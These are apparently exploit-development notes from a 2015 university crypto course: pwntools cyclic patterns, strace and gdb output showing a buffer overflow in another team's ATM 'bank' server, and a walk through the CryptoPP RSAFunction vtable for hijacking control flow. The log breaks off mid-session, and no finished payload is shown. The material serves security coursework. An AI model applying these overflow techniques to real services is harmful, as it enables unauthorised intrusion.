avi@aweinstock-debian:~/Documents/rpi_fall2015/crypto/otherteam_final/atm$ objdump -d backup_bins/bank | grep -A5 'thread_handlePv>:'
0000000000412a10 <_Z13thread_handlePv>:
  412a10:       55                      push   %rbp
  412a11:       48 89 e5                mov    %rsp,%rbp
  412a14:       48 81 ec 70 01 00 00    sub    $0x170,%rsp
  412a1b:       48 8d 04 25 a0 97 62    lea    0x6297a0,%rax
  412a22:       00 
-----
avi@aweinstock-debian:~/Documents/rpi_fall2015/crypto/otherteam_final/atm$ xxd backup_bins/bank | grep 'ed\.'   000b9d0: 6c5f 756e 6578 7065 6374 6564 005f 5a53  l_unexpected._ZS
001d260: 7265 6164 2063 7265 6174 6564 004e 6577  read created.New
001d280: 7320 7061 7273 6564 0052 4541 443a 2000  s parsed.READ: .
001d370: 6574 2062 696e 6420 6661 696c 6564 004c  et bind failed.L
001d3b0: 7420 6c69 7374 656e 2066 6169 6c65 6400  t listen failed.
001d910: 6569 6e69 7469 616c 697a 6564 006e 203c  einitialized.n <
001da30: 616c 6c6f 6361 7465 6400 766f 6964 2043  allocated.void C
002f8f0: 706c 6574 6564 2e36 3937 3300 5f5f 646f  pleted.6973.__do
00315c0: 4f5f 7374 6469 6e5f 7573 6564 005f 5a4e  O_stdin_used._ZN
-----
*Main> pub
PublicKey {public_size = 384, public_n = 4728977487432833207231063170861537275107631947371200572454929534137882898506950673724308317992087411199224634248078098993157239699520929006151626572844876338590566128601330324202263335310407768873920085187879352000455796661511643479345529404156368213236618112251319812551456208480198716446612926623670144123657141379251590285302654278078578921356329644496051691489607085959697808423007397814881809063045164830887783453280063703751975338128379975585196373819784316128817850290062499309417007129419279157310142761700551008543798004293578170356460639664548380837896237936195304558310159414813017020316717874964152334005415221764667510905801991630207128186457996990493931236520552308410119989858915767171670189741228911969388669797231430083924875357455110135594927057744177331697578578988386033017107981123988135247598628244759370251741191839493806189619731519866794594735942800626568946229112268435050368804775487637044723113261, public_e = 17}
*Main> let f n = encrypt (defaultOAEPParams SHA1) pub $ B.replicate n 0x41
*Main> f 343
Left MessageTooLong
*Main> f 342
Right "\179\192Q\171]\235\t\183\&8\209^u\167\175C\132\168C\188\178nX[\161\245\218\250\&3\228\188K\183\151\160?V\165\138\252}\207\128=\NAK\159\204\243h\FS\181M\229\181e\170\207\148h\176\220@\216m\245\\\164\172\138\169\151^\143\219\212\226\&7\237\139q\129\167 \255\CANS\238\202\t\215\138\220\253\233\224G[\210\204\152~_\228{\229\249>\133CvG\150\222k\173\133\&7Q\216p\SUB\196\DC4\158X\149\186\EOTW\170\ETB\233V\SI\"X]\nG\204=\135m\210\194\132\166\215\213\ETX\146\244\216\167\EM\129\228\226\144\184}\230\177\DC1\207\149\226}\bG\r\240P\142B\193\EMx\130\DLED}^\150\ESCk\235\DC2\191\241C|8H2J7\239\SUB\187\NAK:WX\160\138%\240\170\145\&3\223<\177\&4\137A'\ESC\237,?\152vG*\191X\169`\232\DC4\136h<dr\152\179A\246\128V\241\rWN\155\RS\208.(90\b\143^\tQ#kn\FS-\DC1\174\&4P\199 \173\&9g\251\246&\176\231\134 \227\165\180\171\137\252\216AI\"\232\254'\SOs\178Lv@\DC4\164\249H\158\240\181'=\185\USYv\t\155F\188$\223>\254tG<\188\227\v-\191b')l\197\NAK$\DC1<\209\236,\252\"R\152H\SIZ\201\237\243&\192\233X\233\233w_,\NUL\SO\189\153u,'/\170%T\153\242\204\149\156o,\230x\GSA\249\"\210\f"
-----
$ python -c 'import pwn; print pwn.cyclic(342)'
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadka
-----
[pid 27656] read(4, "dummy", 512)       = 5
[pid 27656] open("/dev/urandom", O_RDONLY) = 6
[pid 27656] read(6, "\24c\2458a1~\267\336[\235C\214\343d\36Q\373\336Y`\357\21\371NL\302\341e\f\35\357", 32) = 32
[pid 27656] close(6)                    = 0
[pid 27656] write(4, "DUMMY", 5)        = 5
[pid 27656] read(1633771882, 0x7f9e32448ad0, 128) = -1 EBADF (Bad file descriptor)
[pid 27656] open("/dev/urandom", O_RDONLY) = 6
[pid 27656] read(6, "{5\7\5\250v@\227(\300\321\307\345bFQ\20\261:\277\25EB\312\272\272\302C\350\270v7", 32) = 32
[pid 27656] close(6)                    = 0
[pid 27656] read(1633771882, 0x7f9e32448ad0, 128) = -1 EBADF (Bad file descriptor)
[pid 27656] open("/dev/urandom", O_RDONLY) = 6
[pid 27656] read(6, "V\303\242\205\7f\2474\201\376%2\302\30\313\237\20h\344\232l\3\312f59\205K_.%\342", 32) = 32
[pid 27656] close(6)                    = 0
[pid 27656] read(1633771882, 0x7f9e32448ad0, 128) = -1 EBADF (Bad file descriptor)
[pid 27656] open("/dev/urandom", O_RDONLY) = 6
[pid 27656] read(6, "o\250\217iQ\3\346L\32\306]z\20306{l[\00701\356\353\301\212\220zIQY\365\302", 32) = 32
[pid 27656] close(6)                    = 0
-----
$ python -c 'from pwn import *; print cyclic_find(p32(1633771882))'
36
-----
(gdb) t 3
[Switching to thread 3 (Thread 0x7ffff6187700 (LWP 27877))]
#0  0x00007ffff74c11fd in read () from /lib/x86_64-linux-gnu/libpthread.so.0
(gdb) bt
#0  0x00007ffff74c11fd in read () from /lib/x86_64-linux-gnu/libpthread.so.0
#1  0x00007ffff7a74849 in CryptoPP::NonblockingRng::GenerateBlock(unsigned char*, unsigned long) ()
   from /usr/lib/libcrypto++.so.9
#2  0x00007ffff7a749e4 in CryptoPP::OS_GenerateRandomBlock(bool, unsigned char*, unsigned long) ()
   from /usr/lib/libcrypto++.so.9
#3  0x00007ffff7a74a91 in CryptoPP::AutoSeededRandomPool::Reseed(bool, unsigned int) ()
   from /usr/lib/libcrypto++.so.9
#4  0x000000000041ec2e in CryptoPP::AutoSeededRandomPool::AutoSeededRandomPool(bool, unsigned int) ()
#5  0x0000000000419db4 in action::decrypt_aes(std::string const&, unsigned char*, unsigned char*) ()
#6  0x0000000000419c42 in action::Action::recv(int, std::string&, unsigned char*, unsigned char*) ()
#7  0x000000000041dccd in thread_handle(void*) ()
#8  0x4242424242424242 in ?? ()
#9  0x4242424242424242 in ?? ()
#10 0x4242424242424242 in ?? ()
#11 0x4242424242424242 in ?? ()
#12 0x4242424242424242 in ?? ()
#13 0x4242424242424242 in ?? ()
#14 0x4242424242424242 in ?? ()
#15 0x4242424242424242 in ?? ()
#16 0x4242424242424242 in ?? ()
#17 0x4242424242424242 in ?? ()
#18 0x4242424242424242 in ?? ()
#19 0x4242424242424242 in ?? ()
#20 0x4242424242424242 in ?? ()
#21 0x4242424242424242 in ?? ()
#22 0x4242424242424242 in ?? ()
#23 0x4242424242424242 in ?? ()
#24 0x4242424242424242 in ?? ()
#25 0x4242424242424242 in ?? ()
#26 0x4242424242424242 in ?? ()
#27 0x4242424242424242 in ?? ()
#28 0x4242424242424242 in ?? ()
#29 0x4242424242424242 in ?? ()
#30 0x4242424242424242 in ?? ()
#31 0x4242424242424242 in ?? ()
#32 0x4242424242424242 in ?? ()
#33 0x4242424242424242 in ?? ()
#34 0x4242424242424242 in ?? ()
#35 0x4242424242424242 in ?? ()
#36 0x4242424242424242 in ?? ()
#37 0x4242424242424242 in ?? ()
#38 0x4242424242424242 in ?? ()
#39 0x4242424242424242 in ?? ()
#40 0x4242424242424242 in ?? ()
#41 0x0000424242424242 in ?? ()
#42 0x00007ffff6a6495d in clone () from /lib/x86_64-linux-gnu/libc.so.6
#43 0x0000000000000000 in ?? ()
-----
Starting program: /home/avi/Documents/rpi_fall2015/crypto/otherteam_final/atm/bank 1201
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[New Thread 0x7ffff6988700 (LWP 3365)]
[New Thread 0x7ffff6187700 (LWP 3371)]
[Switching to Thread 0x7ffff6187700 (LWP 3371)]

Breakpoint 1, 0x000000000041b5f6 in bank_aes_handshake(int, CryptoPP::InvertibleRSAFunction&, CryptoPP::RSAFunction&, unsigned char*, unsigned char*, std::string&) ()
(gdb) x/128wx 0x7ffff6186e80 -0x100
0x7ffff6186d80: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff6186d90: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff6186da0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff6186db0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff6186dc0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff6186dd0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff6186de0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff6186df0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff6186e00: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff6186e10: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff6186e20: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff6186e30: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff6186e40: 0x00000080      0x00000000      0xf74bab92      0x00007fff
0x7ffff6186e50: 0x00000000      0x00000000      0xf74b2498      0x00007fff
0x7ffff6186e60: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff6186e70: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff6186e80: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff6186e90: 0xffffd8e8      0x00007fff      0xffffd950      0x00007fff
0x7ffff6186ea0: 0x00000000      0x00000008      0xffffd7f0      0x00007fff
0x7ffff6186eb0: 0xffffd7f0      0x00007fff      0x00000000      0x00000000
0x7ffff6186ec0: 0x00000000      0x00000000      0xf74b9b50      0x00007fff
0x7ffff6186ed0: 0x00000000      0x00000000      0xf6187700      0x00007fff
0x7ffff6186ee0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff6186ef0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff6186f00: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff6186f10: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff6186f20: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff6186f30: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff6186f40: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff6186f50: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff6186f60: 0xf6187700      0x00007fff      0xee5e5fa5      0xb61af01d
0x7ffff6186f70: 0xf74c4220      0x00007fff      0xf61879c0      0x00007fff
(gdb) c
Continuing.
^C
Program received signal SIGINT, Interrupt.
[Switching to Thread 0x7ffff7fd9720 (LWP 3364)]
0x00007ffff74c143d in accept () from /lib/x86_64-linux-gnu/libpthread.so.0
(gdb) thread 3
[Switching to thread 3 (Thread 0x7ffff6187700 (LWP 3371))]
#0  0x00007ffff74c11fd in read () from /lib/x86_64-linux-gnu/libpthread.so.0
(gdb) x/128wx 0x7ffff6186e80 - 0x100
0x7ffff6186d80: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff6186d90: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff6186da0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff6186db0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff6186dc0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff6186dd0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff6186de0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff6186df0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff6186e00: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff6186e10: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff6186e20: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff6186e30: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff6186e40: 0x00000080      0x00000000      0xf74bab92      0x00007fff
0x7ffff6186e50: 0x00000000      0x00000000      0xf74b2498      0x00007fff
0x7ffff6186e60: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff6186e70: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff6186e80: 0x61616161      0x61616162      0x61616163      0x61616164
0x7ffff6186e90: 0x61616165      0x61616166      0x61616167      0x61616168
0x7ffff6186ea0: 0x61616169      0x00000000      0xffffd7f0      0x00007fff
0x7ffff6186eb0: 0xffffd7f0      0x00007fff      0x00000000      0x00000000
0x7ffff6186ec0: 0x00000000      0x00000000      0xf74b9b50      0x00007fff
0x7ffff6186ed0: 0x00000000      0x00000000      0xf6187700      0x00007fff
0x7ffff6186ee0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff6186ef0: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff6186f00: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff6186f10: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff6186f20: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff6186f30: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff6186f40: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff6186f50: 0x00000000      0x00000000      0x00000000      0x00000000
0x7ffff6186f60: 0xf6187700      0x00007fff      0xee5e5fa5      0xb61af01d
0x7ffff6186f70: 0xf74c4220      0x00007fff      0xf61879c0      0x00007fff
(gdb) x/32wx 0x00007fffffffd8e8
0x7fffffffd8e8: 0x0063d758      0x00000000      0x0063d7e8      0x00000000
0x7fffffffd8f8: 0x0063d8b8      0x00000000      0x0063ce70      0x00000000
0x7fffffffd908: 0xf7de6c02      0x00007fff      0x00000040      0x00000000
0x7fffffffd918: 0x00643dc0      0x00000000      0x00000000      0x00000000
0x7fffffffd928: 0x0063ce70      0x00000000      0x00000001      0x00000000
0x7fffffffd938: 0x00000002      0x00000000      0x00640600      0x00000000
0x7fffffffd948: 0x00000000      0x00007fff      0x0063deb8      0x00000000
0x7fffffffd958: 0x0063df88      0x00000000      0x0063e058      0x00000000
(gdb) x/32wx 0x00007fffffffd950
0x7fffffffd950: 0x0063deb8      0x00000000      0x0063df88      0x00000000
0x7fffffffd960: 0x0063e058      0x00000000      0x0063ce70      0x00000000
0x7fffffffd970: 0xffffda00      0x00007fff      0x00000040      0x00000000
0x7fffffffd980: 0x00643560      0x00000000      0x00000000      0x00000000
0x7fffffffd990: 0x0063ce70      0x00000000      0x00414420      0x00000000
0x7fffffffd9a0: 0x00000002      0x00000000      0x006403b0      0x00000000
0x7fffffffd9b0: 0x00000000      0x00007fff      0x0063e0c8      0x00000000
0x7fffffffd9c0: 0x0063e108      0x00000000      0x0063e1e8      0x00000000
(gdb) x/32wx 0x0063d758
0x63d758 <_ZTVN8CryptoPP11RSAFunctionE+24>:     0x0041fed0      0x00000000      0xf7a8f7c0      0x00007fff
0x63d768 <_ZTVN8CryptoPP11RSAFunctionE+40>:     0xf7a8e310      0x00007fff      0xf7a8e2f0      0x00007fff
0x63d778 <_ZTVN8CryptoPP11RSAFunctionE+56>:     0x00428ac0      0x00000000      0x00428b40      0x00000000
0x63d788 <_ZTVN8CryptoPP11RSAFunctionE+72>:     0x00428bc0      0x00000000      0x00428c10      0x00000000
0x63d798 <_ZTVN8CryptoPP11RSAFunctionE+88>:     0xf7a8a740      0x00007fff      0xf7a8afe0      0x00007fff
0x63d7a8 <_ZTVN8CryptoPP11RSAFunctionE+104>:    0xf7a8aa00      0x00007fff      0xf7a8a960      0x00007fff
0x63d7b8 <_ZTVN8CryptoPP11RSAFunctionE+120>:    0xf7a8aaa0      0x00007fff      0xf7a8ade0      0x00007fff
0x63d7c8 <_ZTVN8CryptoPP11RSAFunctionE+136>:    0xf7a8ba50      0x00007fff      0x00000008      0x00000000
(gdb) x/5i 0x00007ffff7a8f7c0
   0x7ffff7a8f7c0 <_ZN8CryptoPP11RSAFunctionD0Ev>:      push   %rbx
   0x7ffff7a8f7c1 <_ZN8CryptoPP11RSAFunctionD0Ev+1>:    mov    %rdi,%rbx
   0x7ffff7a8f7c4 <_ZN8CryptoPP11RSAFunctionD0Ev+4>:
    callq  0x7ffff7983060 <_ZN8CryptoPP11RSAFunctionD1Ev@plt>
   0x7ffff7a8f7c9 <_ZN8CryptoPP11RSAFunctionD0Ev+9>:    mov    %rbx,%rdi
   0x7ffff7a8f7cc <_ZN8CryptoPP11RSAFunctionD0Ev+12>:   pop    %rbx
(gdb) x/5i 0x00007ffff7a8e310
   0x7ffff7a8e310 <_ZNK8CryptoPP11RSAFunction13PreimageBoundEv>:        push   %rbx
   0x7ffff7a8e311 <_ZNK8CryptoPP11RSAFunction13PreimageBoundEv+1>:      add    $0x18,%rsi
   0x7ffff7a8e315 <_ZNK8CryptoPP11RSAFunction13PreimageBoundEv+5>:      mov    %rdi,%rbx
   0x7ffff7a8e318 <_ZNK8CryptoPP11RSAFunction13PreimageBoundEv+8>:
    callq  0x7ffff7983be0 <_ZN8CryptoPP7IntegerC1ERKS0_@plt>
   0x7ffff7a8e31d <_ZNK8CryptoPP11RSAFunction13PreimageBoundEv+13>:     mov    %rbx,%rax
-----
$ c++filt
_ZTVN8CryptoPP11RSAFunctionE
vtable for CryptoPP::RSAFunction
_ZN8CryptoPP11RSAFunctionD0Ev
CryptoPP::RSAFunction::~RSAFunction()
_ZNK8CryptoPP11RSAFunction13PreimageBoundEv
CryptoPP::RSAFunction::PreimageBound() const
-----
(gdb) p &_ZTVN8CryptoPP11RSAFunctionE
$2 = (<data variable, no debug info> *) 0x63d740
(gdb) x/128wx &_ZTVN8CryptoPP11RSAFunctionE
0x63d740 <_ZTVN8CryptoPP11RSAFunctionE>:        0x00000010      0x00000000      0x00000000      0x00000000
0x63d750 <_ZTVN8CryptoPP11RSAFunctionE+16>:     0xf7dc30c0      0x00007fff      0x0041fed0      0x00000000
0x63d760 <_ZTVN8CryptoPP11RSAFunctionE+32>:     0xf7a8f7c0      0x00007fff      0xf7a8e310      0x00007fff
0x63d770 <_ZTVN8CryptoPP11RSAFunctionE+48>:     0xf7a8e2f0      0x00007fff      0x00428ac0      0x00000000
0x63d780 <_ZTVN8CryptoPP11RSAFunctionE+64>:     0x00428b40      0x00000000      0x00428bc0      0x00000000
0x63d790 <_ZTVN8CryptoPP11RSAFunctionE+80>:     0x00428c10      0x00000000      0xf7a8a740      0x00007fff
0x63d7a0 <_ZTVN8CryptoPP11RSAFunctionE+96>:     0xf7a8afe0      0x00007fff      0xf7a8aa00      0x00007fff
0x63d7b0 <_ZTVN8CryptoPP11RSAFunctionE+112>:    0xf7a8a960      0x00007fff      0xf7a8aaa0      0x00007fff
0x63d7c0 <_ZTVN8CryptoPP11RSAFunctionE+128>:    0xf7a8ade0      0x00007fff      0xf7a8ba50      0x00007fff
0x63d7d0 <_ZTVN8CryptoPP11RSAFunctionE+144>:    0x00000008      0x00000000      0xfffffff8      0xffffffff
0x63d7e0 <_ZTVN8CryptoPP11RSAFunctionE+160>:    0xf7dc30c0      0x00007fff      0x004286a0      0x00000000
0x63d7f0 <_ZTVN8CryptoPP11RSAFunctionE+176>:    0xf7a8f800      0x00007fff      0xf798fa70      0x00007fff
0x63d800 <_ZTVN8CryptoPP11RSAFunctionE+192>:    0xf798f470      0x00007fff      0x004289f0      0x00000000
0x63d810 <_ZTVN8CryptoPP11RSAFunctionE+208>:    0xf798ff30      0x00007fff      0xf798ff50      0x00007fff
0x63d820 <_ZTVN8CryptoPP11RSAFunctionE+224>:    0xf7a8aff0      0x00007fff      0xf7990c10      0x00007fff
0x63d830 <_ZTVN8CryptoPP11RSAFunctionE+240>:    0xf7990bd0      0x00007fff      0xf7a8aa90      0x00007fff
0x63d840 <_ZTVN8CryptoPP11RSAFunctionE+256>:    0xf7a8a9f0      0x00007fff      0x00000000      0x00000000
0x63d850 <_ZTVN8CryptoPP11RSAFunctionE+272>:    0x00000000      0x00000000      0x00000000      0x00000000
0x63d860 <_ZTVN8CryptoPP11RSAFunctionE+288>:    0x00000000      0x00000000      0x00000000      0x00000000
0x63d870 <_ZTVN8CryptoPP11RSAFunctionE+304>:    0xfffffff8      0xffffffff      0xfffffff8      0xffffffff
0x63d880 <_ZTVN8CryptoPP11RSAFunctionE+320>:    0x00000000      0x00000000      0xfffffff0      0xffffffff
0x63d890 <_ZTVN8CryptoPP11RSAFunctionE+336>:    0xfffffff0      0xffffffff      0xfffffff0      0xffffffff
0x63d8a0 <_ZTVN8CryptoPP11RSAFunctionE+352>:    0xfffffff0      0xffffffff      0xfffffff0      0xffffffff
0x63d8b0 <_ZTVN8CryptoPP11RSAFunctionE+368>:    0xf7dc30c0      0x00007fff      0x00428700      0x00000000
0x63d8c0 <_ZTVN8CryptoPP11RSAFunctionE+384>:    0xf7a8f7f0      0x00007fff      0xf7a8ae70      0x00007fff
0x63d8d0 <_ZTVN8CryptoPP11RSAFunctionE+400>:    0xf7a8bad0      0x00007fff      0xf7a8ab20      0x00007fff
0x63d8e0 <_ZTVN8CryptoPP11RSAFunctionE+416>:    0x00428d90      0x00000000      0xf798ff40      0x00007fff
0x63d8f0 <_ZTVN8CryptoPP11RSAFunctionE+432>:    0xf798ff60      0x00007fff      0x00429060      0x00000000
0x63d900 <_ZTVN8CryptoPP11RSAFunctionE+448>:    0x00429080      0x00000000      0x004291a0      0x00000000
0x63d910 <_ZTVN8CryptoPP11RSAFunctionE+464>:    0x004292c0      0x00000000      0x00000000      0x00000000
0x63d920 <_ZTIN8CryptoPP6SourceE>:      0x0063e7d0      0x00000000      0xf7adb010      0x00007fff
0x63d930 <_ZTIN8CryptoPP6SourceE+16>:   0x00431920      0x00000000      0x00000000      0x00000000
-----
0x00000010      0x00000000      0x00000000      0x00000000
0xf7dc30c0      0x00007fff      0x0041fed0      0x00000000
0xf7a8f7c0      0x00007fff      0xf7a8e310      0x00007fff
0xf7a8e2f0      0x00007fff      0x00428ac0      0x00000000
0x00428b40      0x00000000      0x00428bc0      0x00000000
0x00428c10      0x00000000      0xf7a8a740      0x00007fff
0xf7a8afe0      0x00007fff      0xf7a8aa00      0x00007fff
0xf7a8a960      0x00007fff      0xf7a8aaa0      0x00007fff
0xf7a8ade0      0x00007fff      0xf7a8ba50      0x00007fff
0x00000008      0x00000000      0xfffffff8      0xffffffff
0xf7dc30c0      0x00007fff      0x004286a0      0x00000000
0xf7a8f800      0x00007fff      0xf798fa70      0x00007fff
0xf798f470      0x00007fff      0x004289f0      0x00000000
0xf798ff30      0x00007fff      0xf798ff50      0x00007fff
0xf7a8aff0      0x00007fff      0xf7990c10      0x00007fff
0xf7990bd0      0x00007fff      0xf7a8aa90      0x00007fff
0xf7a8a9f0      0x00007fff      0x00000000      0x00000000
0x00000000      0x00000000      0x00000000      0x00000000
0x00000000      0x00000000      0x00000000      0x00000000
0xfffffff8      0xffffffff      0xfffffff8      0xffffffff
0x00000000      0x00000000      0xfffffff0      0xffffffff
0xfffffff0      0xffffffff      0xfffffff0      0xffffffff
0xfffffff0      0xffffffff      0xfffffff0      0xffffffff
0xf7dc30c0      0x00007fff      0x00428700      0x00000000
0xf7a8f7f0      0x00007fff      0xf7a8ae70      0x00007fff
0xf7a8bad0      0x00007fff      0xf7a8ab20      0x00007fff
0x00428d90      0x00000000      0xf798ff40      0x00007fff
0xf798ff60      0x00007fff      0x00429060      0x00000000
0x00429080      0x00000000      0x004291a0      0x00000000
0x004292c0      0x00000000      0x00000000      0x00000000
-----
:!awk '{print $2 $1; print $4 $3}' | sed 's/0x//g' | sed 's@^@x/w 0x@' | grep -v '\(0\|f\)\{12,\}'
-----
x/w 0x00007ffff7dc30c0
x/w 0x000000000041fed0
x/w 0x00007ffff7a8f7c0
x/w 0x00007ffff7a8e310
x/w 0x00007ffff7a8e2f0
x/w 0x0000000000428ac0
x/w 0x0000000000428b40
x/w 0x0000000000428bc0
x/w 0x0000000000428c10
x/w 0x00007ffff7a8a740
x/w 0x00007ffff7a8afe0
x/w 0x00007ffff7a8aa00
x/w 0x00007ffff7a8a960
x/w 0x00007ffff7a8aaa0
x/w 0x00007ffff7a8ade0
x/w 0x00007ffff7a8ba50
x/w 0x00007ffff7dc30c0
x/w 0x00000000004286a0
x/w 0x00007ffff7a8f800
x/w 0x00007ffff798fa70
x/w 0x00007ffff798f470
x/w 0x00000000004289f0
x/w 0x00007ffff798ff30
x/w 0x00007ffff798ff50
x/w 0x00007ffff7a8aff0
x/w 0x00007ffff7990c10
x/w 0x00007ffff7990bd0
x/w 0x00007ffff7a8aa90
x/w 0x00007ffff7a8a9f0
x/w 0x00007ffff7dc30c0
x/w 0x0000000000428700
x/w 0x00007ffff7a8f7f0
x/w 0x00007ffff7a8ae70
x/w 0x00007ffff7a8bad0
x/w 0x00007ffff7a8ab20
x/w 0x0000000000428d90
x/w 0x00007ffff798ff40
x/w 0x00007ffff798ff60
x/w 0x0000000000429060
x/w 0x0000000000429080
x/w 0x00000000004291a0
x/w 0x00000000004292c0
-----
(gdb) x/w 0x00007ffff7dc30c0
0x7ffff7dc30c0 <_ZTIN8CryptoPP11RSAFunctionE>:  0x0063f210
(gdb) x/w 0x000000000041fed0
0x41fed0 <_ZN8CryptoPP11RSAFunctionD1Ev>:       0xe5894855
(gdb) x/w 0x00007ffff7a8f7c0
0x7ffff7a8f7c0 <_ZN8CryptoPP11RSAFunctionD0Ev>: 0xfb894853
(gdb) x/w 0x00007ffff7a8e310
0x7ffff7a8e310 <_ZNK8CryptoPP11RSAFunction13PreimageBoundEv>:   0xc6834853
(gdb) x/w 0x00007ffff7a8e2f0
0x7ffff7a8e2f0 <_ZNK8CryptoPP11RSAFunction10ImageBoundEv>:      0xc6834853
(gdb) x/w 0x0000000000428ac0
0x428ac0 <_ZNK8CryptoPP22TrapdoorFunctionBounds11MaxPreimageEv>:        0xe5894855
(gdb) x/w 0x0000000000428b40
0x428b40 <_ZNK8CryptoPP22TrapdoorFunctionBounds8MaxImageEv>:    0xe5894855
(gdb) x/w 0x0000000000428bc0
0x428bc0 <_ZNK8CryptoPP16TrapdoorFunction23ApplyRandomizedFunctionERNS_21RandomNumberGeneratorERKNS_7IntegerE>:0xe5894855
(gdb) x/w 0x0000000000428c10
0x428c10 <_ZNK8CryptoPP16TrapdoorFunction12IsRandomizedEv>:     0xe5894855
(gdb) x/w 0x00007ffff7a8a740
0x7ffff7a8a740 <_ZNK8CryptoPP11RSAFunction13ApplyFunctionERKNS_7IntegerE>:      0x245c8948
(gdb) x/w 0x00007ffff7a8afe0
0x7ffff7a8afe0 <_ZNK8CryptoPP11RSAFunction14GetAlgorithmIDEv>:  0xfb894853
(gdb) x/w 0x00007ffff7a8aa00
0x7ffff7a8aa00 <_ZN8CryptoPP11RSAFunction18BERDecodePublicKeyERNS_22BufferedTransformationEbm>: 0x0030ba55
(gdb) x/w 0x00007ffff7a8a960
0x7ffff7a8a960 <_ZNK8CryptoPP11RSAFunction18DEREncodePublicKeyERNS_22BufferedTransformationE>:  0x0030ba55
(gdb) x/w 0x00007ffff7a8aaa0
0x7ffff7a8aaa0 <_ZNK8CryptoPP11RSAFunction8ValidateERNS_21RandomNumberGeneratorEj>:     0xfd894855
(gdb) x/w 0x00007ffff7a8ade0
0x7ffff7a8ade0 <_ZNK8CryptoPP11RSAFunction12GetVoidValueEPKcRKSt9type_infoPv>:  0x58ec8348
(gdb) x/w 0x00007ffff7a8ba50
0x7ffff7a8ba50 <_ZN8CryptoPP11RSAFunction10AssignFromERKNS_14NameValuePairsE>:  0x48ec8348
(gdb) x/w 0x00007ffff7dc30c0
0x7ffff7dc30c0 <_ZTIN8CryptoPP11RSAFunctionE>:  0x0063f210
(gdb) x/w 0x00000000004286a0
0x4286a0 <_ZThn8_N8CryptoPP11RSAFunctionD1Ev>:  0xe5894855
(gdb) x/w 0x00007ffff7a8f800
0x7ffff7a8f800 <_ZThn8_N8CryptoPP11RSAFunctionD0Ev>:    0x08ef8348
(gdb) x/w 0x00007ffff798fa70
0x7ffff798fa70 <_ZN8CryptoPP13X509PublicKey9BERDecodeERNS_22BufferedTransformationE>:   0x30ba5441
(gdb) x/w 0x00007ffff798f470
0x7ffff798f470 <_ZNK8CryptoPP13X509PublicKey9DEREncodeERNS_22BufferedTransformationE>:  0xfd894855
(gdb) x/w 0x00000000004289f0
0x4289f0 <_ZNK8CryptoPP10ASN1Object9BEREncodeERNS_22BufferedTransformationE>:   0xe5894855
(gdb) x/w 0x00007ffff798ff30
0x7ffff798ff30 <_ZNK8CryptoPP18ASN1CryptoMaterialINS_9PublicKeyEE4SaveERNS_22BufferedTransformationE>:  0x48078b48
(gdb) x/w 0x00007ffff798ff50
0x7ffff798ff50 <_ZN8CryptoPP18ASN1CryptoMaterialINS_9PublicKeyEE4LoadERNS_22BufferedTransformationE>:   0x48078b48
(gdb) x/w 0x00007ffff7a8aff0
0x7ffff7a8aff0 <_ZThn8_NK8CryptoPP11RSAFunction14GetAlgorithmIDEv>:     0x08ee8348
(gdb) x/w 0x00007ffff7990c10
0x7ffff7990c10 <_ZN8CryptoPP13X509PublicKey28BERDecodeAlgorithmParametersERNS_22BufferedTransformationE>:      0x08ec8348
(gdb) x/w 0x00007ffff7990bd0
0x7ffff7990bd0 <_ZNK8CryptoPP13X509PublicKey28DEREncodeAlgorithmParametersERNS_22BufferedTransformationE>:     0x08ec8348
(gdb) x/w 0x00007ffff7a8aa90
